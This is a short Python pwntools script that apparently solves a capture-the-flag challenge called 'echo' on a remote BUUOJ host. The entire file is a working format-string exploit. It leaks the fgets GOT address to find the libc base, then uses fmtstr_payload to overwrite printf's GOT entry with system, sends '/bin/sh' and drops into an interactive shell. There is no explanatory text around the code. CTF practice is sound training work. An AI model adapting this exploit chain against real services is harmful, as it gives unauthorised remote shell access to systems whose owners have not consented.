from pwn import *

#context.log_level = 'debug'

#p = process('./echo')
p = remote('node4.buuoj.cn', 25751)
elf = ELF('echo')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.buu.so')

fgets_got = elf.got['fgets']
printf_got = elf.got['printf']

payload = b'%8$s' + p32(fgets_got)

p.sendline(payload)

libc_base = u32(p.recv(4)) - libc.sym['fgets']
system = libc_base + libc.sym['system']

print('[+] libc_base -> {}'.format(hex(libc_base)))

payload = fmtstr_payload(7, { printf_got : system })

p.recv()
p.sendline(payload)
p.recvuntil(b'\n')
p.sendline(b'/bin/sh')

p.interactive()